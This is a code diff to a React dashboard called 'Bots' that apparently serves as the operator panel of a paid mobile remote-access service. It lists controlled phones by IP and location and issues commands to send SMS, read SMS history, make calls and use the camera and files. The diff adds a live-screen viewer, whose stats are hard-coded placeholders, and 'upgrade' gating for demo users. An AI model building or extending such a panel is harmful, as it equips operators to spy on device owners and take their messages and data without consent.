@@ -4,15 +4,18 @@ import { Card } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
-import { Smartphone, Wifi, Battery, MapPin, MoreVertical, MessageSquare, Phone, Camera, FileText } from "lucide-react";
+import { Smartphone, Wifi, Battery, MapPin, MoreVertical, MessageSquare, Phone, Camera, FileText, Monitor, ChevronLeft, Home, Square } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { useToast } from "@/hooks/use-toast";
+import { useRole } from "@/hooks/useRole";
 
 const Bots = () => {
   const [devices, setDevices] = useState<any[]>([]);
   const [selectedBot, setSelectedBot] = useState<any>(null);
   const [commandDialogOpen, setCommandDialogOpen] = useState(false);
+  const [vncDialogOpen, setVncDialogOpen] = useState(false);
   const { toast } = useToast();
+  const { isDemo } = useRole();
 
   useEffect(() => {
     fetchBots();
@@ -28,6 +31,15 @@ const Bots = () => {
 
   const executeCommand = async (command: string) => {
     if (!selectedBot) return;
+
+    if (isDemo) {
+      toast({
+        title: "Demo Mode",
+        description: "Upgrade your account to control devices",
+        variant: "destructive",
+      });
+      return;
+    }
 
     const { data: { user } } = await supabase.auth.getUser();
     if (!user) return;
@@ -54,7 +66,21 @@ const Bots = () => {
     }
   };
 
+  const openVncViewer = (bot: any) => {
+    if (isDemo) {
+      toast({
+        title: "Demo Mode",
+        description: "Upgrade to view device screens",
+        variant: "destructive",
+      });
+      return;
+    }
+    setSelectedBot(bot);
+    setVncDialogOpen(true);
+  };
+
   const commands = [
+    { icon: Monitor, label: "View Screen", action: "view-screen", special: true },
     { icon: MessageSquare, label: "Send SMS", action: "send-sms" },
     { icon: MessageSquare, label: "Get SMS History", action: "get-sms" },
     { icon: Phone, label: "Make Call", action: "make-call" },
@@ -188,7 +214,7 @@ const Bots = () => {
               <div className="flex gap-2">
                 <Button
                   className="flex-1 bg-primary hover:bg-primary/90 text-primary-foreground"
-                  disabled={device.status === "offline"}
+                  disabled={device.status === "offline" || isDemo}
                   onClick={() => {
                     setSelectedBot(device);
                     setCommandDialogOpen(true);
@@ -196,8 +222,14 @@ const Bots = () => {
                 >
                   Control
                 </Button>
-                <Button variant="outline" className="flex-1">
-                  Details
+                <Button 
+                  variant="outline" 
+                  className="flex-1"
+                  disabled={device.status === "offline" || isDemo}
+                  onClick={() => openVncViewer(device)}
+                >
+                  <Monitor className="w-4 h-4 mr-2" />
+                  Screen
                 </Button>
               </div>
 
@@ -227,7 +259,14 @@ const Bots = () => {
                     key={idx}
                     variant="outline"
                     className="h-auto flex-col gap-3 p-6 hover:bg-primary/10 hover:border-primary transition-all duration-300"
-                    onClick={() => executeCommand(cmd.action)}
+                    onClick={() => {
+                      if ((cmd as any).special) {
+                        setCommandDialogOpen(false);
+                        openVncViewer(selectedBot);
+                      } else {
+                        executeCommand(cmd.action);
+                      }
+                    }}
                   >
                     <div className="p-3 rounded-lg bg-primary/10">
                       <Icon className="w-6 h-6 text-primary" />
@@ -238,6 +277,64 @@ const Bots = () => {
                   </Button>
                 );
               })}
+            </div>
+          </DialogContent>
+        </Dialog>
+
+        {/* VNC Viewer Dialog */}
+        <Dialog open={vncDialogOpen} onOpenChange={setVncDialogOpen}>
+          <DialogContent className="bg-card border-border max-w-5xl">
+            <DialogHeader>
+              <DialogTitle className="text-foreground flex items-center gap-2">
+                <Monitor className="w-5 h-5 text-primary" />
+                {selectedBot?.name} - Live Screen
+              </DialogTitle>
+            </DialogHeader>
+            
+            <div className="space-y-4">
+              {/* Screen Controls */}
+              <div className="flex items-center justify-center gap-4 p-4 bg-muted/30 rounded-lg">
+                <Button variant="outline" size="icon">
+                  <ChevronLeft className="w-5 h-5" />
+                </Button>
+                <Button variant="outline" size="icon">
+                  <Home className="w-5 h-5" />
+                </Button>
+                <Button variant="outline" size="icon">
+                  <Square className="w-5 h-5" />
+                </Button>
+              </div>
+
+              {/* Screen Display */}
+              <div className="relative bg-muted/30 rounded-lg overflow-hidden aspect-[9/16] max-w-md mx-auto border-2 border-border">
+                <div className="absolute inset-0 flex items-center justify-center">
+                  <div className="text-center">
+                    <Monitor className="w-16 h-16 text-muted-foreground mx-auto mb-4" />
+                    <p className="text-muted-foreground mb-2">
+                      Connecting to device...
+                    </p>
+                    <p className="text-xs text-muted-foreground">
+                      {selectedBot?.platform === "ios" ? "iOS" : "Android"} • {selectedBot?.ip}
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Stats */}
+              <div className="grid grid-cols-3 gap-4">
+                <div className="text-center p-3 bg-muted/30 rounded">
+                  <p className="text-xl font-bold text-foreground">30</p>
+                  <p className="text-xs text-muted-foreground">FPS</p>
+                </div>
+                <div className="text-center p-3 bg-muted/30 rounded">
+                  <p className="text-xl font-bold text-foreground">45ms</p>
+                  <p className="text-xs text-muted-foreground">Latency</p>
+                </div>
+                <div className="text-center p-3 bg-muted/30 rounded">
+                  <p className="text-xl font-bold text-foreground">1080p</p>
+                  <p className="text-xs text-muted-foreground">Quality</p>
+                </div>
+              </div>
             </div>
           </DialogContent>
         </Dialog>
